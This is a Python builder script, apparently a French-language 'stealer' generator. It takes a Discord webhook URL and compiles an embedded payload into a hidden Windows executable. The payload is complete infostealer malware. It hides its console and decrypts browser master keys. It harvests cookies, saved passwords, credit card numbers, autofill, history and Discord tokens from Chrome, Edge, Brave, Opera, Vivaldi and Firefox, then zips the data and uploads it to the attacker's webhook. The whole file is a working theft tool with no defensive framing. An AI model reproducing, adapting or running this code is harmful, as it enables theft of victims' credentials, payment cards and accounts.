import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def purple_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (0 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(255 + (255 - 255) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def red_to_yellow(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (255 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(0 + (0 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('\n')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '\n'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('\n')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)
        
        result = []
        color_index = 0
        
        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)
        
        return '\n'.join(result) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

def set_file_attributes(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
    except:
        pass

def main():
    clear_screen()
    
    ascii_art = """
███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    """
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print("\n")
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
    w = input().strip()
    
    if not w.startswith('https://discord.com/api/webhooks/'):
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nWebhook invalide!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'grabber'
    
    payload_code = open('/mnt/user-data/uploads/stealer_payload.txt', 'r').read() if os.path.exists('/mnt/user-data/uploads/stealer_payload.txt') else '''import os
import sys
import sqlite3
import json
import base64
import shutil
from datetime import datetime
import glob
import re
import requests
import ctypes
import zipfile
import io
import time
import hashlib
if sys.platform=="win32":ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
try:
    import win32crypt
    DPAPI_OK=True
except:DPAPI_OK=False
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_OK=True
except:CRYPTO_OK=False
class AntiBanStealer:
    def __init__(self):
        self.browsers={'Chrome':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Google','Chrome','User Data'),'profiles':['Default','Profile 1','Profile 2','Profile 3']},'Edge':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Microsoft','Edge','User Data'),'profiles':['Default','Profile 1','Profile 2']},'Brave':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'BraveSoftware','Brave-Browser','User Data'),'profiles':['Default','Profile 1','Profile 2']},'Opera':{'path':os.path.join(os.environ.get('APPDATA',''),'Opera Software','Opera Stable'),'profiles':['']},'OperaGX':{'path':os.path.join(os.environ.get('APPDATA',''),'Opera Software','Opera GX Stable'),'profiles':['']},'Vivaldi':{'path':os.path.join(os.environ.get('LOCALAPPDATA',''),'Vivaldi','User Data'),'profiles':['Default','Profile 1']},'Firefox':{'path':os.path.join(os.environ.get('APPDATA',''),'Mozilla','Firefox','Profiles'),'profiles':[]}}
        self.data={'cookies':[],'passwords':[],'autofill':[],'cards':[],'history':[],'downloads':[],'bookmarks':[],'tokens':[],'sessions':[]}
        self.stats={'browsers_found':0,'profiles_scanned':0,'total_cookies':0,'total_passwords':0,'total_cards':0,'total_tokens':0}
        self.session_id=hashlib.md5(f"{os.environ.get('COMPUTERNAME','')}{datetime.now().timestamp()}".encode()).hexdigest()[:8]
    def get_master_key(self,browser_path):
        try:
            local_state=os.path.join(browser_path,'Local State')
            if not os.path.exists(local_state):return None
            with open(local_state,'r',encoding='utf-8')as f:local_state_data=json.load(f)
            encrypted_key=base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
        except:return None
    def decrypt_value(self,encrypted_value,master_key):
        try:
            if encrypted_value[:3]==b'v10'or encrypted_value[:3]==b'v11':
                nonce=encrypted_value[3:15]
                ciphertext=encrypted_value[15:-16]
                tag=encrypted_value[-16:]
                cipher=AESGCM(master_key)
                return cipher.decrypt(nonce,ciphertext+tag,None).decode('utf-8',errors='ignore')
            else:return win32crypt.CryptUnprotectData(encrypted_value,None,None,None,0)[1].decode('utf-8',errors='ignore')
        except:return ""
    def grab_chromium_cookies(self,browser_name,profile_path):
        cookies_path=os.path.join(profile_path,'Network','Cookies')
        if not os.path.exists(cookies_path):cookies_path=os.path.join(profile_path,'Cookies')
        if not os.path.exists(cookies_path):return
        temp_db=cookies_path+'.tmp'
        try:
            shutil.copy2(cookies_path,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT host_key,name,value,encrypted_value,path,expires_utc FROM cookies")
            rows=cursor.fetchall()
            master_key=self.get_master_key(os.path.dirname(profile_path))
            for host,name,value,encrypted_value,path,expires in rows:
                decrypted=value
                if encrypted_value and master_key:decrypted=self.decrypt_value(encrypted_value,master_key)
                self.data['cookies'].append({'browser':browser_name,'host':host,'name':name,'value':decrypted,'path':path,'expires':expires})
                self.stats['total_cookies']+=1
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_chromium_passwords(self,browser_name,profile_path):
        login_data=os.path.join(profile_path,'Login Data')
        if not os.path.exists(login_data):return
        temp_db=login_data+'.tmp'
        try:
            shutil.copy2(login_data,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT origin_url,username_value,password_value FROM logins")
            rows=cursor.fetchall()
            master_key=self.get_master_key(os.path.dirname(profile_path))
            for url,username,encrypted_password in rows:
                password=""
                if encrypted_password and master_key:password=self.decrypt_value(encrypted_password,master_key)
                if username or password:
                    self.data['passwords'].append({'browser':browser_name,'url':url,'username':username,'password':password})
                    self.stats['total_passwords']+=1
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_chromium_cards(self,browser_name,profile_path):
        web_data=os.path.join(profile_path,'Web Data')
        if not os.path.exists(web_data):return
        temp_db=web_data+'.tmp'
        try:
            shutil.copy2(web_data,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
            rows=cursor.fetchall()
            master_key=self.get_master_key(os.path.dirname(profile_path))
            for name,month,year,encrypted_number in rows:
                number=""
                if encrypted_number and master_key:number=self.decrypt_value(encrypted_number,master_key)
                if name or number:
                    self.data['cards'].append({'browser':browser_name,'name':name,'number':number,'exp_month':month,'exp_year':year})
                    self.stats['total_cards']+=1
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_chromium_autofill(self,browser_name,profile_path):
        web_data=os.path.join(profile_path,'Web Data')
        if not os.path.exists(web_data):return
        temp_db=web_data+'.tmp'
        try:
            shutil.copy2(web_data,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT name,value FROM autofill LIMIT 100")
            rows=cursor.fetchall()
            for name,value in rows:self.data['autofill'].append({'browser':browser_name,'name':name,'value':value})
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_chromium_history(self,browser_name,profile_path):
        history_path=os.path.join(profile_path,'History')
        if not os.path.exists(history_path):return
        temp_db=history_path+'.tmp'
        try:
            shutil.copy2(history_path,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
            rows=cursor.fetchall()
            for url,title,visits,last_visit in rows:self.data['history'].append({'browser':browser_name,'url':url,'title':title,'visits':visits})
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_chromium_tokens(self,browser_name,profile_path):
        localstorage_path=os.path.join(profile_path,'Local Storage','leveldb')
        if not os.path.exists(localstorage_path):return
        token_patterns=[r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',r'mfa\\.[\\w-]{84}',r'[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}']
        for file_path in glob.glob(os.path.join(localstorage_path,'*.ldb')):
            try:
                with open(file_path,'r',encoding='utf-8',errors='ignore')as f:content=f.read()
                for pattern in token_patterns:
                    tokens=re.findall(pattern,content)
                    for token in tokens:
                        if token not in[t['token']for t in self.data['tokens']]:
                            self.data['tokens'].append({'browser':browser_name,'token':token,'type':'Discord'if'.'in token else'Other'})
                            self.stats['total_tokens']+=1
            except:pass
    def grab_firefox_cookies(self,profile_path):
        cookies_path=os.path.join(profile_path,'cookies.sqlite')
        if not os.path.exists(cookies_path):return
        temp_db=cookies_path+'.tmp'
        try:
            shutil.copy2(cookies_path,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            cursor.execute("SELECT host,name,value,path FROM moz_cookies")
            rows=cursor.fetchall()
            for host,name,value,path in rows:
                self.data['cookies'].append({'browser':'Firefox','host':host,'name':name,'value':value,'path':path})
                self.stats['total_cookies']+=1
            conn.close()
            os.remove(temp_db)
        except:pass
    def grab_firefox_passwords(self,profile_path):
        logins_path=os.path.join(profile_path,'logins.json')
        if not os.path.exists(logins_path):return
        try:
            with open(logins_path,'r',encoding='utf-8')as f:logins_data=json.load(f)
            for login in logins_data.get('logins',[]):
                self.data['passwords'].append({'browser':'Firefox','url':login.get('hostname',''),'username':login.get('encryptedUsername',''),'password':login.get('encryptedPassword','')})
                self.stats['total_passwords']+=1
        except:pass
    def grab_all_browsers(self):
        for browser_name,browser_info in self.browsers.items():
            browser_path=browser_info['path']
            if not os.path.exists(browser_path):continue
            self.stats['browsers_found']+=1
            if browser_name=='Firefox':
                for profile_dir in os.listdir(browser_path):
                    profile_path=os.path.join(browser_path,profile_dir)
                    if os.path.isdir(profile_path):
                        self.stats['profiles_scanned']+=1
                        self.grab_firefox_cookies(profile_path)
                        self.grab_firefox_passwords(profile_path)
            else:
                for profile_name in browser_info['profiles']:
                    if profile_name:profile_path=os.path.join(browser_path,profile_name)
                    else:profile_path=browser_path
                    if not os.path.exists(profile_path):continue
                    self.stats['profiles_scanned']+=1
                    self.grab_chromium_cookies(browser_name,profile_path)
                    self.grab_chromium_passwords(browser_name,profile_path)
                    self.grab_chromium_cards(browser_name,profile_path)
                    self.grab_chromium_autofill(browser_name,profile_path)
                    self.grab_chromium_history(browser_name,profile_path)
                    self.grab_chromium_tokens(browser_name,profile_path)
    def create_compact_report(self):
        report={'session_id':self.session_id,'date':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'pc':os.environ.get('COMPUTERNAME','Unknown'),'user':os.environ.get('USERNAME','Unknown'),'stats':self.stats,'data':{'cookies':self.data['cookies'][:300],'passwords':self.data['passwords'],'cards':self.data['cards'],'tokens':self.data['tokens']}}
        return report
    def send_optimized(self):
        try:
            time.sleep(2)
            report=self.create_compact_report()
            temp_dir=os.environ.get('TEMP','')
            json_file=os.path.join(temp_dir,f'data_{self.session_id}.json')
            with open(json_file,'w',encoding='utf-8')as f:json.dump(report,f,separators=(',',':'),ensure_ascii=False)
            zip_buffer=io.BytesIO()
            with zipfile.ZipFile(zip_buffer,'w',zipfile.ZIP_DEFLATED,compresslevel=9)as zip_file:zip_file.write(json_file,'data.json')
            zip_buffer.seek(0)
            file_size_kb=len(zip_buffer.getvalue())/1024
            webhook_url="WEBHOOK_URL_PLACEHOLDER"
            if file_size_kb<50:description=f"Session {self.session_id}"
            else:description=f"Large dataset - {file_size_kb:.1f}KB"
            embed={"embeds":[{"description":description,"color":0x2ecc71,"fields":[{"name":"PC","value":f"`{report['pc']}`","inline":True},{"name":"User","value":f"`{report['user']}`","inline":True},{"name":"Browsers","value":str(self.stats['browsers_found']),"inline":True},{"name":"Cookies","value":str(self.stats['total_cookies']),"inline":True},{"name":"Passwords","value":str(self.stats['total_passwords']),"inline":True},{"name":"Cards","value":str(self.stats['total_cards']),"inline":True}],"footer":{"text":f"ID: {self.session_id}"},"timestamp":datetime.utcnow().isoformat()}]}
            files={'file':(f'{self.session_id}.zip',zip_buffer,'application/zip')}
            data={'payload_json':json.dumps(embed,separators=(',',':'))}
            headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response=requests.post(webhook_url,files=files,data=data,headers=headers,timeout=45)
            if response.status_code==429:
                retry_after=int(response.json().get('retry_after',5))
                time.sleep(retry_after+1)
                requests.post(webhook_url,files={'file':(f'{self.session_id}.zip',zip_buffer,'application/zip')},data=data,headers=headers,timeout=45)
            os.remove(json_file)
        except Exception as e:pass
    def run(self):
        try:
            self.grab_all_browsers()
            self.send_optimized()
        except:pass
def main():
    try:
        stealer=AntiBanStealer()
        stealer.run()
    except:pass
if __name__=="__main__":main()'''
    
    c = payload_code.replace('WEBHOOK_URL_PLACEHOLDER', '{webhook_url}')
    
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'
    
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(c.replace('{webhook_url}', w))
    
    set_file_attributes(t)
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
        sys.exit()
    
    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--hidden-import', 'sqlite3',
        '--hidden-import', 'cryptography',
        '--hidden-import', 'cryptography.hazmat.primitives.ciphers.aead',
        '--hidden-import', 'win32crypt',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)
    
    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
        print(r.stderr[:500])
        sys.exit()
    
    shutil.move(f'dist/{n}_temp.exe', e)
    
    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass
    
    print()
    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print("\n")
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
    print()

if __name__ == "__main__":
    main()
